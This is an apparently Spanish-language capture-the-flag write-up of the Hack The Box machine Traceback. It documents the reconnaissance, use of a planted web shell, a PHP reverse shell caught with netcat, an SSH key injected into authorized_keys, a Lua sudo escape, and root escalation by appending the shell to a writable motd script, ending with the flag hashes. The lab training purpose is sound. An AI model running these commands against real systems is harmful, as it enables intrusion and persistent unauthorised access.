---
layout: post
title: Traceback - Walkthrough
date: 2020-08-15 20:44
description: Traceback, una máquina en la que nos encontramos con un deface del sitio principal y vamos descubriendo los pasos tomados por el atacante anterior. Divertido!
toc: true
comments: false
tags: 
 - OSCP
 - Walkthrough
 - HackTheBox

---

## **Walkthrough de Traceback**
---

![img]({{ '/assets/images/Traceback/Traceback_00.png' | relative_url }}){: .center-image }*(Descripción)*

---
Traceback, una máquina en la que nos encontramos con un deface del sitio principal y vamos descubriendo los pasos tomados por el atacante anterior. Divertido!

---

## **Links**
Traceback en Hack The Box](https://www.hackthebox.eu/home/machines/profile/131)

---


## **Enumeración y Reconocimiento**
---

> ``nmap -A -T4 -p 22,80  10.10.10.181 -oA Traceback``

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 19:44 -03
Nmap scan report for 10.10.10.181
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.2.2 (Linux 3.4) (93%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   239.21 ms 10.10.14.1
2   239.34 ms 10.10.10.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.55 seconds
```

Los resultados de `nikto` y `dirb` no son muy buenos. Por ahora no me dedico al puerto 22. Entrando con un browser al puerto 80 se encuentra el deface del sitio:

![img]({{ '/assets/images/Traceback/Traceback_01.png' | relative_url }}){: .center-image }*(Deface)*

La página habla de un backdoor pero no se como se llama, por lo menos tengo el nombre del supuesto hacker **Xh4H**, si se googlea el nombre exixte un usuario de [GitHub](https://github.com/Xh4H) con varios repositorios.

Inspeccionando el código fuernte del HTML aparece un comentario:

```html
<body>
        <center>
                <h1>This site has been owned</h1>
                <h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
                <h3> - Xh4H - </h3>
                <!--Some of the best web shells that you might need ;)-->
        </center>
</body>
```

Justamente, el usuario de GitHub tiene un repositorio con la descripción `Some of the best web shells that you might need` que contiene webshells.

---

![img]({{ '/assets/images/Traceback/Traceback_02.png' | relative_url }}){: .center-image }*(Github)*

---

ingresando al repositorio se puede ver que hay varios webshells pero ¿Cual podrá ser?

---

![img]({{ '/assets/images/Traceback/Traceback_03.png' | relative_url }}){: .center-image }*(Repositorio)*

---

Lo que hice fue crear una lista con los nombres de los webshells y pasarselos a `dirb`:

```console
alfa3
alfav3.0.1
andela
bloodsecv4
by
c99ud
cmd
configkillerionkros
jspshell
mini
obfuscated-punknopass
punk-nopass
punkholic
r57
smevk
wso2.8.5
```

> `dirb http://10.10.10.181 /root/Traceback/backdoors -X .php`

```console
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Aug 14 18:49:54 2020
URL_BASE: http://10.10.10.181/
WORDLIST_FILES: /root/Traceback/backdoors
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 16

---- Scanning URL: http://10.10.10.181/ ----
+ http://10.10.10.181/smevk.php (CODE:200|SIZE:1261)

-----------------
END_TIME: Fri Aug 14 18:49:58 2020
DOWNLOADED: 16 - FOUND: 1
```
---


## **Explotación**
---

Teniendo el nombre del backdoor e ingresando por el browser se nos presenta con la siguiente pantalla de login:

![img]({{ '/assets/images/Traceback/Traceback_04.png' | relative_url }}){: .center-image }*(Login)*

---

y si se inspecciona el código fuente del mismo se puede ver que las credenciales son `admin:admin`

---

![img]({{ '/assets/images/Traceback/Traceback_05.png' | relative_url }}){: .center-image }*(Adentro)*

---

Parece ser un webshell bastante poderoso aunque solo me dediqué a hacer lo más simple, ver la manera de subir una reverse shell, voy con el buen `php-reverse-shell.php`.

1. Se modifica el script `php-reverse-shell.php`.
2. Se sube mediante el webshell.
3. Se abre un socket con `netcat -lnvp 443`.
3. Se hace consulta a la página para recibir la shell `curl http://10.10.10.181/shell.php`.

```console
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.181.
Ncat: Connection from 10.10.10.181:35590.
Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 06:34:14 up  4:09,  2 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sysadmin pts/1    10.10.14.11      04:22    2:11m  0.00s  0.00s -sh
root     pts/2    10.10.14.11      04:22    2:11m  0.02s  0.02s -bash
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

corriendo el comando `sudo -l` se ve que podemos correr un script de `lua` como el usuario `sysadmin`

```console
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```
si trato de correrlo con la terminal que tengo da error así que manos a la obra con mejorar la TTY, ¿Porque no SSH?

Adicionalmente se encuentra un archivo llamado `note.txt` dentro de la carpeta home del usuario **webadmin** con el siguiente contenido:

```console
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Desconozco el password del usuario **webadmin** para poder entrar por **SSH** pero pudiendo subir archivos puedo generar un par de llaves rsa y agregarla a las llaves autorizadas del usuario para poder loguearme de esa manera, para eso:

En Kali:

> `ssh-keygen -f mykey -t rsa -b 1024`

y tengo dos archivos llamados `mykey` (llave privada) y `mykey.pub` (llave pública)

> `cat mykey.pub`

```console
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDEJknTEwSqMP9to1BhYwF/kr3Cpoavb6EfKZz/BTvw/LOlmxrEAyMbJUBBOogtXKiwO7eQqOyK2eHnZdCd5Laq7cX58Coc5lDWdbBJUdNrKqwlbiDrA4x38+W6Ir95ClkfaxnWB3FonfZwnP0wQAsm7AltbH0gKMCH/NDOUXHF3Q== root@duende
```

Dentro de Traceback:

> `echo "
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDEJknTEwSqMP9to1BhYwF/kr3Cpoavb6EfKZz/BTvw/LOlmxrEAyMbJUBBOogtXKiwO7eQqOyK2eHnZdCd5Laq7cX58Coc5lDWdbBJUdNrKqwlbiDrA4x38+W6Ir95ClkfaxnWB3FonfZwnP0wQAsm7AltbH0gKMCH/NDOUXHF3Q== root@duende" >> /home/webadmin/.ssh/authorized_keys`

En Kali:

> `ssh -i mykey webadmin@10.10.10.181`


En Traceback:

```console
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 14 04:19:56 2020 from 10.10.14.11
```

---


## **Escalamiento de Privilegios**
---

El script de LUA corre como el usuario **sysadmin**

googleando un poco se encuentra que existe una forma de escapar del shell limitado en el que me meti con el siguente comando:

> `os.execute("/bin/bash")`

```console
-u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
os.execute("/bin/bash")
sysadmin@traceback:~$ whoami
sysadmin
```

Así que tengo un bash corriendo como **sysadmin** para normalizar la terminal, nuevamente agrego la llave pública de mi Kali a al archivo `authorized_keys` y listo, SSH.

> `ssh -i mykey sysadmin@10.10.10.181`

```console
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
```
---

Corriendo `linpeas.sh` aparece que algunos `motd` que corren con privilegio de **root** son modificables por **sysadmin**, además esos motd se corren en el momento que se inicia sesión.

```console
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group sysadmin:
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
/home/webadmin/note.txt
/dev/mqueue/linpeas.txt
```

Así que para ahorrar un poco de tiempo agrego la ejecución del reverse shell de php que use para la conexión original al archivo `/etc/update-motd.d/00-header`. Si todo sale bien en el momento que me loguee de nueso por ssh se tiene que ejecutar el script y recibir la shell reversa con privilegios de root.

> `echo 'php /var/www/html/shell.php' >> /etc/update-motd.d/00-header`

> `netcat -lnvp 443`

```console
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.181.
Ncat: Connection from 10.10.10.181:33756.
Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:06:28 up 15:26,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sysadmin pts/0    10.10.14.23      06:33    4.00s  0.24s  0.24s /bin/bash
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
Exito!!

## **Flags**
---

```console
cat user.txt
f122d3efed03f97fd6aeb72e86b5f98c

cat root.txt
f6d0f67845059e777d8d06be952c93bb
```

---